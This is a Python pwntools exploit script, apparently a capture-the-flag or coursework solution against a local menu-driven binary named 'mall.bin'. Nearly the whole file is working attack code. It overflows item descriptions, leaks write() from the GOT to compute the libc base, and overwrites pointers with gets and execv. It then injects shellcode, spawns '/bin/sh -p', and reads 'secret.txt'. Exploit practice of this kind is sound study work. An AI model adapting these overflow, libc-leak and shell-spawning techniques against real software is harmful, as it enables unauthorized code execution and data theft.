#!/usr/bin/python3

from pwn import *


def exploit():
    # Write your exploit logic here.
    p = process("./mall.bin")
    # mov $0x6020f8, %rsi
    # callq *0x30(%rbp)
    # retq
    shell_code = b"\x48\x31\xf6\x48\xc7\xc6\xf0\x20\x60\x00\xff\x55\x18\xc3" # 11 bytes

    rop = ROP("./mall.bin")
    #print(rop.rdi, rop.rsi)
    rdi_gadget = p64(0x4013a3)
    rsi_gadget = p64(0x4013a1) 

    libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
    write_offset = libc.symbols['write']
    gets_offset = libc.symbols['gets']
    execv_offset = libc.symbols['execv']
    puts_offset = libc.symbols['puts']

    add_pc(p, b"a1")
    modify(p, b"a1", b"a"*72)
    add_pc(p, b"a2")
    modify(p, b"a1", b"a"*73)
    p.recvuntil(b"Invalid choice")
    add_pc(p, b"a3")
    modify(p, b"a1", b"a"*32 + p64(0x602038))
    list_item(p)
    
    for i in range(2) :
        p.recvline()
    p.recvuntil(b"(")
    write_addr = p.recvuntil(b"): $1")
    #p.recvuntil(b": ")
    write_addr = write_addr[:-5]
    write_byte_addr = write_addr
    write_addr = int.from_bytes(write_addr, 'little') # 정수형으로 고쳐짐
    base_addr = write_addr - write_offset 
    gets_addr = base_addr + gets_offset
    gets_byte_addr = gets_addr.to_bytes(8, byteorder='little')
    execv_addr = base_addr + execv_offset
    execv_byte_addr = execv_addr.to_bytes(8, byteorder='little')
    puts_addr = base_addr + puts_offset
    puts_byte_addr = puts_addr.to_bytes(8, byteorder='little')


    modify(p, b"a1", b"a"*48 + gets_byte_addr)

    view_item(p, b"a"*31 +b"/bin/sh\x00"+b"-p"+b"\x00"*14+execv_byte_addr +p64(0x4012f7)
              +b"\x00"*8+p64(0x4012f7))
    input("pause")
    modify(p, b"a"*31+b"/", shell_code)
    input("pause")
    view_item(p, b"/bin/sh")
    print(p.recvline())
    sleep(0.2)
    p.sendline(b"cat secret.txt")
    sleep(0.2)
    print(p.recvuntil(b"Invalid choice"))
    print(p.recvuntil(b": "))
    print(p.recv(1))
    

    
    

def add_pc(p:process, name:bytes) :
    p.recvuntil(b": ")
    p.sendline(b"A")
    p.recvuntil(b": ")
    p.sendline(b"pc")
    p.recvuntil(b": ")
    p.sendline(name)
    for i in range(5) :
        p.recvuntil(b": ")
        p.sendline(b"1")

def modify(p:process, name, description) :
    p.recvuntil(b": ")
    p.sendline(b"M")
    p.recvuntil(b": ")
    p.sendline(name)
    p.recvuntil(b": ")
    p.sendline(description)

def view_item(p:process, name) :
    p.recvuntil(b": ")
    p.sendline(b"V")
    p.recvuntil(b": ")
    p.sendline(name)

def list_item(p:process):
    p.recvuntil(b": ")
    p.sendline(b"L")

def delete_item(p:process, name) :
    p.recvuntil(b": ")
    p.sendline(b"D")
    p.recvuntil(b": ")
    p.sendline(name)

if __name__ == "__main__":
    exploit()
